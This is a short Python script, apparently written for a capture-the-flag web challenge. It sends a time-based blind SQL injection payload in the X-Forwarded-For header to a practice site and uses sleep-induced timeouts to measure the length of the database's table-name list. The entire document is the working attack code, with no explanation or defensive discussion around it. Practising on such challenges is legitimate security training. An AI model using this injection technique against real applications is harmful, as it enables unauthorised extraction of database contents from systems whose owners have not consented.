url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
i=1
table_length=0
tables=""

while True:
    headers={
            "X-Forwarded-For":"1' and case when(substring((select group_concat(table_name separator ';') from information_schema.tables where table_schema='web4') from %s for 1)='') then sleep(6) else 0 end and 'a'='a" % (i)
            }
    try:
        r = requests.get(url, headers=headers, timeout=6)
        print(" "+r.text)
        i+=1
    except:
       table_length = i-1
       break
print(table_length)